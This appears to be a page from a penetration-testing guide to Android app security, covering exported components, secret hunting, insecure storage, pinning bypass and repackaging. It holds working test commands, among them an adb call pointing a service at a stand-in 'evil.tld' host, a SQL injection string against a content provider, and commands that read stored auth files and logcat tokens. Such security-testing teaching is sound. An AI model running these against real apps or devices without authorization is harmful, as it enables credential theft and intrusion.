# Android App Testing

An Android app is a shippable archive you can unzip, read, patch, and re-run. The attack surface splits into the client (what the app stores and exposes on the device) and the backend (the API, covered in `Mobile-API-and-Transport-Security.md`). The highest-value client bugs are exported components, insecure storage of secrets and tokens, and weak transport controls you can strip.

## The mental model

The APK contains the code (DEX, decompilable to Java/Smali), the manifest (the declared attack surface), native libraries, and resources. The device is a hostile environment the developer does not control, so anything the app trusts to be hidden on the device (keys, logic, client-side checks) is not. You read the app to find what it trusts, then you abuse the components it exposes to other apps and the data it leaves on disk.

## Where it hides / tell-tales

- **The manifest is the exported-surface map**: `AndroidManifest.xml` declares activities, services, broadcast receivers, and content providers. Any with `android:exported="true"` (or an intent-filter, which implies exported pre-Android 12) can be invoked by other apps on the device. Exported components that perform sensitive actions or trust their input are the classic local privilege/logic bugs.
- **Secrets in the APK**: API keys, backend URLs, encryption keys, and credentials hardcoded in code, resources (`strings.xml`), or native libs. "Hidden in native code" is not hidden; it is one `strings`/disassembly away.
- **Insecure local storage**: tokens, PII, and credentials in `SharedPreferences` (plaintext XML), SQLite databases, internal files, or world-readable locations. Logcat leakage of tokens is common.
- **Weak transport**: no certificate pinning (so you proxy everything), or pinning you can bypass (Frake/objection), or `cleartextTraffic` allowed, or a custom `TrustManager` that accepts all certs.
- **Deep links and IPC**: custom URI schemes and app links that reach sensitive functionality (see `Deep-Links-and-IPC.md`).
- **Client-side security theatre**: root detection, tamper checks, and feature gates enforced only on the client, which you patch out.
- **WebViews**: `setJavaScriptEnabled(true)` plus `addJavascriptInterface` (JS-to-native bridge) plus loading attacker-influenced content equals RCE-in-app; `setAllowFileAccess`/`setAllowUniversalAccessFromFileURLs` enabling local file theft.

## Real material

Static triage of an APK:

```
apktool d app.apk              # decode manifest + smali + resources
jadx -d out app.apk            # decompile DEX to readable Java
# read the manifest for exported components and permissions:
grep -i "exported=\"true\"" out/resources/AndroidManifest.xml
# hunt secrets and endpoints:
grep -rinE 'https?://|api[_-]?key|secret|password|token|AKIA|-----BEGIN' out/
strings lib/arm64-v8a/*.so | grep -iE 'http|key|secret'
```

Invoking an exported component from another app (or `adb`) to test trust:

```
# exported activity that trusts an extra:
adb shell am start -n com.target.app/.AdminActivity --es role admin
# exported service:
adb shell am startservice -n com.target.app/.SyncService --es url http://evil.tld
# broadcast receiver that acts on an intent:
adb shell am broadcast -a com.target.app.ACTION_RESET --es user victim
# content provider read (potential IDOR / SQLi in the provider):
adb shell content query --uri content://com.target.app.provider/users/1
adb shell content query --uri content://com.target.app.provider/users/1?a=' OR '1'='1
```

Reading what the app stored:

```
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml
adb shell run-as com.target.app ls  /data/data/com.target.app/databases/
adb logcat | grep -iE 'token|password|authorization'
```

## Beyond the basics

- **Content provider injection**: an exported (or grant-URI) content provider often maps directly to SQLite. The `uri`, `selection`, and `projection` become SQL, so SQL injection and path traversal (for file-backed providers) are reachable from any app on the device. Test `content query`/`content update`/`content delete` with injection in each parameter.
- **Intent redirection and `PendingIntent` hijacking**: an app that forwards an attacker-supplied intent (`getParcelableExtra("intent")` then `startActivity`) lets you launch internal, non-exported components (confused deputy). Mutable `PendingIntent`s handed to other apps let the holder fill in the blanks and act as the victim app. High-impact, frequently missed.
- **Runtime instrumentation with Frida/objection**: hook methods to bypass root detection and SSL pinning, dump decrypted strings and keys at runtime, call internal methods directly, and change return values of client-side checks. This turns "the app hides it" into "I read it as it runs." Objection automates pinning bypass, class enumeration, and keystore dumping.
- **Patch and repackage**: decompile, remove a client-side check (root/tamper/pin) in smali, rebuild with `apktool b`, sign, and run. Proves that client-side enforcement is worthless and unlocks testing of gated features.
- **WebView bridge exploitation**: if `addJavascriptInterface` exposes methods and the WebView loads attacker-controllable content (a deep link, an HTTP page without pinning, a loaded file), you reach native methods from JS. `@JavascriptInterface`-annotated methods are the callable surface; enumerate and abuse them.
- **Backup and debuggable flags**: `android:allowBackup="true"` lets `adb backup` extract app data without root; `android:debuggable="true"` lets you attach a debugger and run code as the app. Both are easy wins when present.
- **Deep static-to-dynamic loop**: static analysis finds the interesting components and endpoints; dynamic (Frida, proxying, `adb` component invocation) confirms exploitability. Neither alone is enough.

## What to watch for

- Pre-Android 12, a component with an intent-filter is exported by default even without `exported="true"`; on 12+ explicit `exported` is required. Check the `targetSdk` to know the default.
- A hardcoded "key" may be a public identifier (a Maps API key restricted by package signature) rather than a secret; confirm it actually unlocks something and is not scope-restricted.
- Storage that looks plaintext may be in the Android Keystore (hardware-backed), which you cannot simply read; distinguish Keystore-protected material from plaintext `SharedPreferences`.
- Repackaging and instrumenting someone else's production app is for your own test devices and authorized scope; do not distribute modified apps.

## Hunting checklist

- Decompile with `jadx`/`apktool`; read the manifest for exported components, permissions, `debuggable`, `allowBackup`, `cleartextTraffic`.
- Grep code, resources, and native libs for secrets and endpoints.
- Invoke every exported activity/service/receiver and query every content provider (with injection) via `adb`.
- Dump `SharedPreferences`, databases, and logcat for stored tokens/PII.
- Test deep links and WebView bridges (see `Deep-Links-and-IPC.md`).
- Use Frida/objection to bypass pinning and root detection and to dump runtime secrets.
- Then pivot to the backend API, which is usually the richer target (see `Mobile-API-and-Transport-Security.md`).
